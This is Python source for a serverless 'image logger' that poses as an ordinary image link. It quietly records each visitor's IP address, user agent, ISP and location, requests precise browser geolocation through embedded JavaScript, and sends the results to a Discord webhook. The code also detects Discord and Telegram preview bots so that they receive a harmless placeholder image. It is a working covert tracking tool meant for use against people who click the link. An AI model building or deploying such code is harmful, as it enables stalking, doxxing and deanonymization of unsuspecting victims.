from urllib import parse
import traceback
import requests
import base64
import httpagentparser
import os

# CONFIG
WEBHOOK = os.environ.get("WEBHOOK_URL")
DEFAULT_IMAGE = os.environ.get("DEFAULT_IMAGE", "https://i.imgur.com/bI81qPe.jpeg")
USERNAME = os.environ.get("WEBHOOK_NAME", "🦍 King Caesar's Spy")
EMBED_COLOR = int(os.environ.get("EMBED_COLOR", "0xFF9900"))

BLACKLISTED_IPS = ("27", "104", "143", "164")


def bot_check(ip, useragent):
    """Detect Discord/Telegram bots."""
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False


def report_error(error: str):
    """Send an error to Discord."""
    if not WEBHOOK:
        return
    try:
        requests.post(
            WEBHOOK,
            json={
                "username": USERNAME,
                "content": "@everyone",
                "embeds": [
                    {"title": "Image Logger - Error", "color": EMBED_COLOR, "description": f"```\n{error}\n```"}
                ],
            },
        )
    except Exception:
        pass


def make_report(ip, useragent=None, coords=None, endpoint="N/A", image_url=False):
    """Send a detailed IP report to Discord."""
    if not WEBHOOK or ip.startswith(BLACKLISTED_IPS):
        return

    bot = bot_check(ip, useragent)
    if bot:
        try:
            requests.post(
                WEBHOOK,
                json={
                    "username": USERNAME,
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": EMBED_COLOR,
                            "description": f"**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                        }
                    ],
                },
            )
        except Exception:
            pass
        return

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except Exception:
        info = {}

    try:
        os_name, browser = httpagentparser.simple_detect(useragent)
    except Exception:
        os_name, browser = "Unknown", "Unknown"

    embed = {
        "username": USERNAME,
        "content": "@everyone",
        "embeds": [
            {
                "title": "🦍 King Caesar's Tracker - IP Logged",
                "color": EMBED_COLOR,
                "description": f"""
**Endpoint:** `{endpoint}`
**IP:** `{ip}`
**Provider:** `{info.get('isp', 'Unknown')}`
**Country:** `{info.get('country', 'Unknown')}`
**Region:** `{info.get('regionName', 'Unknown')}`
**City:** `{info.get('city', 'Unknown')}`
**Coords:** `{coords if coords else str(info.get('lat', '')) + ', ' + str(info.get('lon', ''))}`
**OS:** `{os_name}`
**Browser:** `{browser}`
**User Agent:** `{useragent}`
""",
            }
        ],
    }

    if image_url:
        embed["embeds"][0].update({"thumbnail": {"url": image_url}})

    try:
        requests.post(WEBHOOK, json=embed)
    except Exception:
        pass

    return info


# Minimal image for bots
LOADING_IMAGE = base64.b85decode(
    b"|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000"
)


def handler(request):
    """Vercel serverless function handler."""
    try:
        ip = request.headers.get("x-forwarded-for", "Unknown")
        useragent = request.headers.get("user-agent", "Unknown")
        query = parse.parse_qs(parse.urlsplit(request.url).query)
        image_url = DEFAULT_IMAGE

        if "url" in query:
            image_url = base64.b64decode(query["url"][0].encode()).decode()
        elif "id" in query:
            image_url = base64.b64decode(query["id"][0].encode()).decode()

        if bot_check(ip, useragent):
            return {
                "statusCode": 200,
                "headers": {"Content-Type": "image/jpeg"},
                "isBase64Encoded": True,
                "body": base64.b64encode(LOADING_IMAGE).decode("utf-8"),
            }

        coords = None
        if "g" in query:
            try:
                coords = base64.b64decode(query["g"][0].encode()).decode()
            except Exception:
                coords = None

        make_report(ip, useragent, coords, request.path, image_url)

        html = f"""<style>body{{margin:0;padding:0}}div.img{{background-image:url('{image_url}');background-position:center;background-repeat:no-repeat;background-size:contain;width:100vw;height:100vh}}</style><div class="img"></div>
<script>
var currenturl = window.location.href;
if(!currenturl.includes("g=") && navigator.geolocation){{
navigator.geolocation.getCurrentPosition(function(c){{location.replace(currenturl+(currenturl.includes("?")?"&":"?")+"g="+btoa(c.coords.latitude+","+c.coords.longitude).replace(/=/g,"%3D"));}});
}}
</script>"""

        return {"statusCode": 200, "headers": {"Content-Type": "text/html"}, "body": html}

    except Exception:
        report_error(traceback.format_exc())
        return {"statusCode": 500, "headers": {"Content-Type": "text/html"}, "body": "500 - Internal Server Error"}


# Vercel entry point
def main(request):
    return handler(request)
